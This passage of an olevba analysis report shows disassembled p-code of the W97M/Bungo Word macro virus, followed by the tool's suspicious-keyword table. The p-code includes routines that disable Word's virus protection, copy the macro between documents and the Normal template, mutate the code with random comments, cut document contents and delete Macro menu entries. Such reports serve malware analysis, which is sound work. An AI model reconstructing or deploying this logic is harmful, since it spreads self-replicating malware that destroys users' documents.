' 	Rem 0x0019 " OvGjGuJhTtEwOrBqEoKjRiTw"
' Line #158:
' 	Rem 0x004B " FsOzGhQwNoSjJjHeAqCqPpBkTpSwGgPtRvThTrSjDiBiGwBiQiKzPyNeVtDeIkVmKlKfDuCySz"
' Line #159:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #160:
' 	ArgsCall (Call) GoToHell 0x0000 
' Line #161:
' 	EndSub 
' Line #162:
' Line #163:
' 	FuncDefn (Sub FileSaveAs())
' Line #164:
' 	OnError (Resume Next) 
' Line #165:
' 	ArgsCall (Call) Payload 0x0000 
' Line #166:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #167:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #168:
' 	Rem 0x0033 " SgLoKuPuGjMhEvUhIlVlFsJuSjTgDsLwDzSpLwAoCiCzHuTeAp"
' Line #169:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #170:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #171:
' 	LitVarSpecial (False)
' 	St DocInfect 
' Line #172:
' 	LitVarSpecial (False)
' 	St GlobInfect 
' Line #173:
' 	Rem 0x0015 " OiVlEvRsErBrIgLvQmGo"
' Line #174:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GlobalDoc 
' Line #175:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ActiveDoc 
' Line #176:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #177:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Bungo"
' 	Eq 
' 	IfBlock 
' Line #178:
' 	LitVarSpecial (True)
' 	St DocInfect 
' Line #179:
' 	EndIfBlock 
' Line #180:
' 	StartForVariable 
' 	Next 
' Line #181:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #182:
' 	Ld j 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Bungo"
' 	Eq 
' 	IfBlock 
' Line #183:
' 	LitVarSpecial (True)
' 	St GlobInfect 
' Line #184:
' 	EndIfBlock 
' Line #185:
' 	StartForVariable 
' 	Next 
' Line #186:
' 	Ld GlobInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #187:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Bungo"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #188:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #189:
' 	EndIfBlock 
' Line #190:
' 	Ld DocInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #191:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Bungo"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #192:
' 	Ld ActiveDoc 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #193:
' 	EndIfBlock 
' Line #194:
' 	Rem 0x0039 " GsQzUlCyIlCzUyCiNvEwAeCfFlHgDwJxVrToVwPgKfSmFyHqSrFoLjEh"
' Line #195:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #196:
' 	ArgsCall (Call) GoToHell 0x0000 
' Line #197:
' 	EndSub 
' Line #198:
' Line #199:
' 	FuncDefn (Sub FileSave())
' Line #200:
' 	OnError (Resume Next) 
' Line #201:
' 	ArgsCall (Call) Payload 0x0000 
' Line #202:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #203:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #204:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #205:
' 	LitVarSpecial (False)
' 	St DocInfect 
' Line #206:
' 	LitVarSpecial (False)
' 	St GlobInfect 
' Line #207:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GlobalDoc 
' Line #208:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ActiveDoc 
' Line #209:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #210:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Bungo"
' 	Eq 
' 	IfBlock 
' Line #211:
' 	LitVarSpecial (True)
' 	St DocInfect 
' Line #212:
' 	EndIfBlock 
' Line #213:
' 	StartForVariable 
' 	Next 
' Line #214:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #215:
' 	Ld j 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Bungo"
' 	Eq 
' 	IfBlock 
' Line #216:
' 	LitVarSpecial (True)
' 	St GlobInfect 
' Line #217:
' 	EndIfBlock 
' Line #218:
' 	StartForVariable 
' 	Next 
' Line #219:
' 	Ld GlobInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #220:
' 	Rem 0x0027 " NyVoOiPwKyLlGxJuApVxBoEsVrGsInUtHrJwUs"
' Line #221:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Bungo"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #222:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #223:
' 	EndIfBlock 
' Line #224:
' 	Ld DocInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #225:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Bungo"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #226:
' 	Ld ActiveDoc 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #227:
' 	EndIfBlock 
' Line #228:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #229:
' 	ArgsCall (Call) GoToHell 0x0000 
' Line #230:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #231:
' 	Rem 0x0035 " EjJuEmJjJhFwDqIyGqFePxQyReUjJrCuSrPkAkFhJfJeNwNzKnPe"
' Line #232:
' 	EndSub 
' Line #233:
' Line #234:
' 	FuncDefn (Sub GoToHell())
' Line #235:
' 	Rem 0x001B " GkNlNwDtThSrPoLvTsHrGvNtSx"
' Line #236:
' 	OnError (Resume Next) 
' Line #237:
' 	ArgsCall Read 0x0000 
' Line #238:
' 	Rem 0x004D " GeBeEmFvHeHnNrLqJuGiDpInSoGzFuKoRiQmJnNuRfLtSqJqFxLhRsPfBrGrGfDsTyEyJqPoSrFo"
' Line #239:
' 	LitStr 0x0005 "Bungo"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ActiveLines 
' Line #240:
' 	Ld ActiveLines 
' 	LitDI2 0x012C 
' 	Gt 
' 	IfBlock 
' Line #241:
' 	StartWithExpr 
' 	LitStr 0x0005 "Bungo"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #242:
' 	StartForVariable 
' 	Ld TheLine 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	For 
' Line #243:
' 	Rem 0x001F " RhGuQoTjOzHxQuFjAuDtMsSePnKrRm"
' Line #244:
' 	Ld TheLine 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Rem"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld TheLine 
' 	ArgsMemCallWith DeleteLines 0x0001 
' 	EndIf 
' Line #245:
' 	Rem 0x0013 " FvRoDrRwMeOhQyPvPo"
' Line #246:
' 	StartForVariable 
' 	Ld TheLine 
' 	EndForVariable 
' 	NextVar 
' Line #247:
' 	EndWith 
' Line #248:
' 	ElseBlock 
' Line #249:
' 	StartWithExpr 
' 	LitStr 0x0005 "Bungo"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #250:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	St PolySize 
' Line #251:
' 	Rem 0x0021 " FsIjSiMnKhOzDzSsSnQnPtQwEwDvNhAt"
' Line #252:
' 	StartForVariable 
' 	Ld PolyMorphic 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld PolySize 
' 	For 
' Line #253:
' 	LitStr 0x0000 ""
' 	St PolyString 
' Line #254:
' 	MemLdWith CountOfLines 
' 	St PolyLines 
' Line #255:
' 	Ld Rnd 
' 	Ld PolyLines 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St RndLine 
' Line #256:
' 	Ld Rnd 
' 	LitDI2 0x0027 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St StringSize 
' Line #257:
' 	StartForVariable 
' 	Ld SomeString 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld StringSize 
' 	For 
' Line #258:
' 	Ld PolyString 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St PolyString 
' Line #259:
' 	StartForVariable 
' 	Ld SomeString 
' 	EndForVariable 
' 	NextVar 
' Line #260:
' 	Ld RndLine 
' 	LitStr 0x0004 "Rem "
' 	Ld PolyString 
' 	Concat 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #261:
' 	StartForVariable 
' 	Ld PolyMorphic 
' 	EndForVariable 
' 	NextVar 
' Line #262:
' 	Rem 0x0005 " UgUi"
' Line #263:
' 	EndWith 
' Line #264:
' 	EndIfBlock 
' Line #265:
' 	EndSub 
' Line #266:
' Line #267:
' 	FuncDefn (Sub Payload())
' Line #268:
' 	OnError (Resume Next) 
' Line #269:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	LitDI2 0x001E 
' 	Le 
' 	And 
' 	IfBlock 
' Line #270:
' 	Ld Selection 
' 	ArgsMemCall Wholestory 0x0000 
' Line #271:
' 	Ld Selection 
' 	ArgsMemCall Cut 0x0000 
' Line #272:
' 	EndIfBlock 
' Line #273:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #274:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #275:
' 	LitStr 0x0018 "Templates and add-ins..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #276:
' 	LitStr 0x000D "Lucky Warrior"
' 	Ld Application 
' 	MemSt Username 
' Line #277:
' 	LitStr 0x0002 "LW"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #278:
' 	LitStr 0x0013 "Bgy. Tiguib, O.E.S."
' 	Ld Application 
' 	MemSt UserAddress 
' Line #279:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #280:
' 	LitStr 0x000D "Lucky Warrior"
' 	MemStWith Author 
' Line #281:
' 	LitStr 0x000A "W97M/Bungo"
' 	MemStWith Keywords 
' Line #282:
' 	LitStr 0x000F "More to come..."
' 	MemStWith Comments 
' Line #283:
' 	ArgsMemCallWith Execute 0x0000 
' Line #284:
' 	EndWith 
' Line #285:
' 	EndSub 
' Line #286:
' Line #287:
' Line #288:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

